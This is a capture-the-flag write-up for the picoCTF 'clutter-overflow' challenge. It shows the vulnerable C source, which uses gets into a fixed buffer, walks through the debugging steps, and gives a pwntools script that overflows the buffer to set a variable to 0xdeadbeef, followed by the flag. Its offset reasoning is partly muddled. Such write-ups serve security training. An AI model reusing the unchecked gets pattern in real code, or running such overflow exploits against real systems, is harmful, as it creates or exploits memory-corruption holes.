# clutter-overflow
#### Write-up author: [jon-brandy](https://github.com/jon-brandy)
## DESCRIPTION:
Clutter, clutter everywhere and not a byte to use. 
`nc mars.picoctf.net 31890`

> Challenge Endpoints

[FILE 1](https://github.com/jon-brandy/CTF-WRITE-UP/blob/96af015d1549822d4b32c853d0fc081954537bcd/Asset/clutter-overflow/chall.c)
[FILE 2](https://github.com/jon-brandy/CTF-WRITE-UP/blob/96af015d1549822d4b32c853d0fc081954537bcd/Asset/clutter-overflow/chall.pdf)

## HINTS:
- NONE
## STEPS:
1. First, download both file given.
2. Then let's check the file type of the `chall` program.

![image](https://user-images.githubusercontent.com/70703371/185035005-c7a9a63f-ea81-4780-a5f0-2e670c4b8456.png)

3. It's an ELF 64 Bit and thx God it's not stripped, so we would be able to see function names.
4. Next, i run `checksec` to see what kind of binary protections are enabled.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/185035183-248594a0-cc16-47ec-8eb3-692ec47125a9.png)

5. Since there's no canary found so we may do bufferoverflow, notice **NX is enabled** so if we inject code, we can't execute it. **PIE** is also disabled, so each time the binary loads it load at the same location in memory.
6. Now let's view the source code.

> chall.c

```c
#include <stdio.h>
#include <stdlib.h>

#define SIZE 0x100
#define GOAL 0xdeadbeef

const char* HEADER = 
" ______________________________________________________________________\n"
"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|\n"
"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |\n"
"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|\n"
"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \\^ ^ |\n"
"|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \\ ^ _ ^ / |                | \\^ ^|\n"
"| ^/_\\^ ^ ^ /_________\\^ ^ ^ /_\\ | //  | /_\\ ^| |   ____  ____   | | ^ |\n"
"|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|\n"
"| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |\n"
"|^ ^ ^ ^ ^| /     (   \\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \\|^ ^|\n"
".-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |\n"
"|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\\ |^ ^|\n"
"| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |\n"
"|'.____'_^||/!\\@@@@@/!\\|| _'______________.'|==                    =====\n"
"|\\|______|===============|________________|/|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\" ||\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"  \n"
"\"\"''\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"";

int main(void)
{
  long code = 0;
  char clutter[SIZE];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);
 	
  puts(HEADER); 
  puts("My room is so cluttered...");
  puts("What do you see?");

  gets(clutter);


  if (code == GOAL) {
    printf("code == 0x%llx: how did that happen??\n", GOAL);
    puts("take a flag for your troubles");
    system("cat flag.txt");
  } else {
    printf("code == 0x%llx\n", code);
    printf("code != 0x%llx :(\n", GOAL);
  }

  return 0;
}

```S

7. Notice there's a vuln here, where we can do buffer overflow.

![image](https://user-images.githubusercontent.com/70703371/185035940-9ac136f3-5b71-43d8-bdd9-50d715f3c453.png)

8. Since the string input is not specified -> `gets` not `fgets`.
9. Also we may get the `flag.txt` if we meet this conditions.

![image](https://user-images.githubusercontent.com/70703371/185036242-626aa7af-d749-4876-935a-bd2d586bc8f1.png)

> If the code variable has the same size as GOAL -> 0xdeadbeef, got the flag.

10. Next, let's open `gdb` to check out the bufferoverflow and see where the offset is at.
11. Now enter `disass main`.

![image](https://user-images.githubusercontent.com/70703371/185041129-64e1dd84-b861-4d7b-a2af-aff73c5be1a8.png)


> NOTES:

```
SIZE -> 0x100 = 256. To buffer it let's input more thatn 256 bytes.
```


12. Let's input `300` characters.
13. To simplified that i made the `.c` program.


```c
#include <stdio.h>

int main(void)
{
    char a = 'A';
    for(int i = 1; i <= 300; i++)
    {
        printf("%c", a);
    }

    return 0;
}
```


14. Copy the output.
15. Now enter `run` at your `pwndbg` terminal.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/185042312-2c31de6b-d6c5-4a6f-9956-dc58e92e7e3b.png)

16. Paste the output.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/185042370-663e2a4e-4fb5-442c-b0d0-841e2392ebaf.png)

![image](https://user-images.githubusercontent.com/70703371/185042391-945fbea6-4172-4cb5-9390-3b3e8adca532.png)

17. The program crashed, because we just overflown the buffer.
18. Notice here, the program knowledged that the input we enter is equal to this.

![image](https://user-images.githubusercontent.com/70703371/185042736-2ed627da-59e2-494c-a605-ba6a6eef21a1.png)

19. Not the `deadbeef`.
20. Let's open the program file in IDA.

![image](https://user-images.githubusercontent.com/70703371/185046700-02658b5a-6fea-445f-bed7-97c0ed980e88.png)

21. Press `f5` to decompile it.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/185046743-26932b91-d873-4f51-bd90-9dbe402d72d2.png)

22. Hmm.. The size changed to 264 and not 256.

![image](https://user-images.githubusercontent.com/70703371/185046800-933d07b2-7608-42dd-90da-651af7d9fb6c.png)

23. Kinda confused here.
24. Now let's jump to `rsp+0h`.

> STACK

![image](https://user-images.githubusercontent.com/70703371/185046984-45d6369d-cbd1-4e4f-b98b-71af1ee0f37c.png)

25. Seems the correct bytes to do buffer overflow is 264 + 8 + 8 -> 280 bytes.
26. For this solution i made a python script using `ret2win` concept.

```py
from pwn import *

offset = 0x108 # 264

payload = flat(b'A' * offset, 0xdeadbeef)

sh = remote('mars.picoctf.net', 31890)

sh.sendlineafter('see?\n', payload)

sh.interactive()

```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/185056804-d79fdbb9-e136-44fa-af56-f2f1a4ed6353.png)


27. Finally, we got the flag!

```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```


## REFERENCES:

```
https://int0x33.medium.com/day-1-rop-emporium-ret2win-64bit-bb0d1893a3b0
https://0xrick.github.io/binary-exploitation/bof1/
```

